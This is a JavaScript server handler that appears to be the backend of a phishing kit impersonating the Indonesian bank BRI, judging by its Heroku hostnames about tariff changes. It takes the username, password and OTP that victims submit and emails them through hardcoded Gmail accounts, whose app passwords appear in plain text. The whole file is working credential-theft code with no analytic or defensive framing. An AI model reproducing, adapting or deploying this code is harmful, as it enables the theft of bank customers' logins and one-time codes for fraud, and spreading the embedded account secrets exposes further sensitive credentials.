export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';
   
    if (url == 'pilih-tarif-baru.herokuapp.com'){

       email = 'lajutobo74@gmail.com'
       pass = 'mfuzhjhciqkcqdwx'
    }else
    
    if (url == 'pilih-tarif-baru.herokuapp.com'){

       email = 'asaklancar011@gmail.com'
       pass = 'ugvdwsvnrxjolwlo'
    }else
    
    if (url == 'pilihan-tarif-bri.herokuapp.com'){

       email = 'mbahagia19@gmail.com'
       pass = 'bscwibbxbivxaluk'
    }else
    
    if (url == 'pilih-tarif-brii-herokuapp.com'){

       email = 'basenglah460@gmail.com'
       pass = 'wjvaeltorqzfqdcm'
    }else
    if (url == 'pilihan-tarif-bri-new.herokuapp.com'){

       email = 'landaslepas77@gmail.com'
       pass = 'eyosohykexzgicup'
    }else
    if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
    {

        email = 'suksesk541@gmail.com'; //email
        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
        
    } else if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
    {
        email = 'besarhasil47@gmail.com'; //email
        pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
        
    } else if (url == 'formpilihan-tarif.herokuapp.com'){
        email= 'barulink236@gmail.com';
        pass = 'bopgkupysveiukmb';
    }
    else {

        email = 'tapa89911@gmail.com';
        pass = 'qqukcjtkxobpztko';

    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'Welcome to the app',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li>
                        <li>password: ${body.password ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>

                    </ul>`
                ,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
